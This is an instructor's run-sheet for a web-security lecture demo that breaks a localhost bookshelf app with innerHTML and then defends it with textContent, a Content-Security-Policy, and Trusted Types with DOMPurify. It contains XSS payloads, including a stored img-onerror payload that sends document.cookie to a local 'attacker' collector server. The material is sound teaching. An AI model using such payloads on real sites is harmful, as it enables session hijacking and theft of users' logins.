# Demo: break it, then fix it — 06a Web Security

**CSCI 3230U · Lecture 06a · instructor run-sheet (not a student handout)**

This is the live demo for slide 16. It starts from the class 9 bookshelf
(the typed solution) and attacks it, then defends it in layers. Everything
runs on `localhost`; no real site and no real cookie is involved.

The bookshelf already does the right thing — `bookCard` uses
`textContent`, with the comment *"textContent, never innerHTML: titles are
typed by users (XSS)."* The demo's whole point is to undo that one line,
watch the page get taken over, and then earn the line back.

## What you need open before class

Three terminals, all inside this `demo/` folder, plus a browser:

| # | Command | What it is |
|---|---|---|
| 1 | `npm install` then `npm run build` then `npm run serve` | the site, on `http://localhost:8000` |
| 2 | `npm run watch` | rebuilds `dist/` on every save (leave running) |
| 3 | `python3 collector.py` | the "attacker's server", on `http://localhost:9000` |

Open `http://localhost:8000` in Chrome with DevTools showing the
**Console** tab. Keep the editor on `src/script.ts` and `index.html`.

> First run only: `npm install` pulls TypeScript into `node_modules/`.
> `dist/` and `node_modules/` are rebuilt from source, so they aren't
> committed.

Each step says **what to do**, **what the class sees**, and the **line to
land**. Timings are a guide; the short path (if the lecture ran long) is
steps 1–5 then 7, skipping 6 and 8–10.

---

## 1. The page works (30 sec)

Reload `http://localhost:8000`. Four books load after a short delay (the
`slowFetch` from class 9). Add a book with the form — it appears. Remove
one — it goes.

> **Land it:** "This is the app from last class. Nothing here is unsafe
> yet. Watch how little it takes to change that."

## 2. Break it: innerHTML (1 min)

In `src/script.ts`, find the title line in `bookCard`:

```ts
  // textContent, never innerHTML: titles are typed by users (XSS).
  const title = document.createElement("h3");
  title.textContent = book.title;        // <-- this line
```

Change **only** that one line to:

```ts
  title.innerHTML = book.title;          // DANGER (on purpose)
```

Save. Terminal 2 rebuilds. This is **not** a type error — `innerHTML`
takes a string — so it compiles cleanly. That's the point: the type
checker from last class does nothing here.

> **Land it:** "TypeScript is happy. A type system catches the wrong
> *shape* of data, not a dangerous *use* of it. Security is a separate
> problem."

## 3. It's only text... until it isn't (2 min)

Reload. Add three books, one title at a time, and narrate each:

| Title you type | What happens | Why |
|---|---|---|
| `<b>bold</b>` | the word **bold**, in bold | `innerHTML` parsed it as a tag |
| `<script>alert(1)</script>` | *nothing* | `innerHTML` won't run injected `<script>` |
| `<img src=x onerror="alert('XSS')">` | an alert box fires | the image fails to load, so `onerror` runs |

> **Land it:** "Blocking `<script>` is not a defence — the third one has no
> `<script>` in it. Any attribute that runs code, like `onerror`, is
> enough. This is **cross-site scripting**: their code, running in our
> page, as our page."

(Close the alert. Alerts block the page — this is the one place in the demo
we use one, and only for a beat.)

## 4. Stored XSS and a stolen cookie (4 min)

So far *we* typed the payload. Real XSS is **stored**: it rides in the data
every visitor loads. Our `books.json` is that data — the "API response"
from class 7.

First give the page a cookie to steal (it sets none on its own). In the
Console:

```js
document.cookie = "session=abc123";
```

Now open `books.json` and add a fifth book whose **title is the payload**.
Point it at the collector in terminal 3:

```json
  { "id": "5", "title": "<img src=x onerror=\"new Image().src='http://localhost:9000/?c='+document.cookie\">", "author": "nobody", "status": "want", "pages": 1 }
```

(Mind the JSON: the inner quotes are escaped with `\"`.) Save. Reload the
page — **don't type anything this time.**

Terminal 3 prints:

```
>>> STOLEN  ?c=session=abc123
```

> **Land it:** "No one typed anything. The payload was in the data, it ran
> for every visitor, and it sent the session cookie to a server we don't
> control. On a real site that cookie *is* the login."

Leave the payload in `books.json` for the next steps — it's the thing the
defences have to stop.

## 5. Fix it: textContent (1 min)

Put the line in `src/script.ts` back:

```ts
  title.textContent = book.title;
```

Save, reload. The malicious book now shows its title **as literal text**:
`<img src=x onerror=...>` appears on the card, harmless. Terminal 3 stays
silent.

> **Land it:** "`textContent` is escaping. The browser shows the characters
> and runs nothing. This is the first and most important layer — output
> data as text, not as HTML."

## 6. Backstop: a Content-Security-Policy (3 min, slide 8)

Layers exist because someone will add an `innerHTML` next year. Show the
backstop that catches it anyway.

Break the line again (`innerHTML`). Reload — the cookie is stolen again.
Now add a CSP to `index.html`, in `<head>`:

```html
  <meta http-equiv="Content-Security-Policy" content="script-src 'self'">
```

Reload. The payload is **blocked** and the Console shows:

```
Refused to execute inline event handler because it violates the
following Content Security Policy directive: "script-src 'self'".
```

The app still works: `dist/script.js` is from our own origin (`'self'`).

> **Land it:** "The bug is still there — `innerHTML` is still wrong — but
> the CSP refused the injected handler. `script-src` without
> `'unsafe-inline'` blocks every inline `onerror` and inline `<script>`.
> Defence in depth: the sanitizing slipped, the CSP held."

Put `textContent` back and remove the CSP line before moving on, so the
rest of the demo starts clean. (Or keep the CSP — it does no harm.)

## 7. CORS: our own page, refused (2 min, slide 12)

Different port = different origin. In a **second** terminal in this folder:

```bash
python3 -m http.server 8001
```

On the page served from `:8000`, in the Console:

```js
fetch("http://localhost:8001/books.json").then(r => r.json()).then(console.log);
```

It fails:

```
Access to fetch at 'http://localhost:8001/books.json' from origin
'http://localhost:8000' has been blocked by CORS policy: No
'Access-Control-Allow-Origin' header is present on the requested resource.
```

> **Land it:** "That's not an attack — that's the browser protecting the
> *user*. `:8001` is a different origin and never said we're allowed to
> read it. A CORS error is fixed on the **server**, by it sending
> `Access-Control-Allow-Origin` — and the value is **our** origin,
> `http://localhost:8000`, not its own. (Slide 12's header has that
> backwards.)"

## 8. A secret in the bundle (1 min, slide 14)

In `src/script.ts`, near the top, add:

```ts
const API_KEY = "sk_live_abc123"; // pretend secret
```

Save (watch rebuilds). In DevTools → **Sources** → `dist/script.js`, press
Ctrl-F and search `sk_live`. There it is.

> **Land it:** "Anything shipped to the browser is public — minifying
> doesn't hide it, and a `.env` baked into the bundle doesn't either. When
> React starts next week, `VITE_*` variables get built straight into the
> bundle. Secrets stay on the server." *(Delete the line after.)*

## 9. Bypass the UI (1 min, slide 15)

The form's `required` on the title is UX, not security. Prove it: in
DevTools, select the title `<input>` and delete its `required` attribute,
then submit empty. It goes through — the HTML check is gone, and nothing
else enforces it.

> **Don't** `curl -X POST http://localhost:8000/...` here: `python3 -m
> http.server` only answers GET/HEAD, so a POST returns `501 Unsupported
> method ('POST')`. That's not a bypass — there's no backend to bypass to.
> Our demo is a static file server with no endpoint that accepts writes.
> So the *server-side* half of the lesson can only be stated, not shown:
> in a real app the POST would reach a handler, and **that** handler must
> re-validate, because `curl` and DevTools skip every client check.

> **Land it:** "Client checks are for instant feedback. The form's
> `required` just vanished in DevTools. In a real app a request can arrive
> from `curl` with no browser at all, so the **server** must validate
> everything again — that's the backend course."

## 10. (Optional) Trusted Types + DOMPurify (slide 9)

Only if there's time and you want to show the strongest layer. This needs a
package and a Chromium browser.

```bash
npm install dompurify
```

Add to the CSP so raw strings can't reach a sink at all:

```html
  <meta http-equiv="Content-Security-Policy"
        content="script-src 'self'; require-trusted-types-for 'script'">
```

With `innerHTML` still broken, reload: the page now **throws** at the
assignment — `This document requires 'TrustedHTML' assignment`. The only
way to produce `TrustedHTML` is one audited policy. In `src/script.ts`:

```ts
import DOMPurify from "/node_modules/dompurify/dist/purify.es.mjs";

const policy = (window as any).trustedTypes.createPolicy("bookshelf", {
  createHTML: (s: string) => DOMPurify.sanitize(s),
});
// ...then, in bookCard:
title.innerHTML = policy.createHTML(book.title) as unknown as string;
```

Reload. The title renders as text, the handler is stripped, nothing is
stolen — and if anyone writes a *bare* `innerHTML` anywhere else, the
browser throws instead of running it.

> **Land it:** "DOMPurify strips the dangerous bits; Trusted Types makes
> the browser refuse any HTML that didn't go through it. You can't forget a
> sink, because forgetting throws."

---

## Reset between runs / sections

```bash
git checkout -- src/script.ts index.html books.json   # if under git
```

Or by hand: title line back to `textContent`, remove the CSP `<meta>`,
delete book `"5"` from `books.json`, delete the `API_KEY` line. Clear the
cookie with `document.cookie = "session=; max-age=0";`.

## The five lines, if nothing else survives

1. **Never trust user data** — the client is the UI, the server is the gate.
2. **XSS** is user input rendered as HTML → `textContent`, sanitize, CSP.
3. **CSRF** is another site using your cookie → `SameSite`, tokens.
4. **CORS** protects the user; the server opts in, naming *your* origin.
5. **Secrets stay server-side**; sessions in `HttpOnly` cookies.
